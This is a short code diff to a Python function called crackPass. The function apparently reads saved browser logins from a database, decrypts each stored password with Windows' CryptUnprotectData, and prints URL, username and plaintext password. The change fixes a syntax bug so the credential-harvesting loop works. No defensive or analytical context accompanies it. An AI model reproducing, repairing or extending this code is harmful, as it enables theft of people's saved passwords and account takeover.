@@ -12,14 +12,13 @@ def crackPass():
     cursor.execute(select)
 
     data = cursor.fetchall()
-
     dictionary = {}
     string = ''
 
     for url, user_name, passwd in data:
         passwd = win32crypt.CryptUnprotectData(passwd)
-        dictionary[url] = (user_name. passwd[1].decode('utf8'))
-        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,passwd[1].decode('utf8'))
+        dictionary[url] = (user_name, passwd[1].decode('utf-8'))
+        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url, user_name, passwd[1].decode('utf8'))
         print(string)
 
 
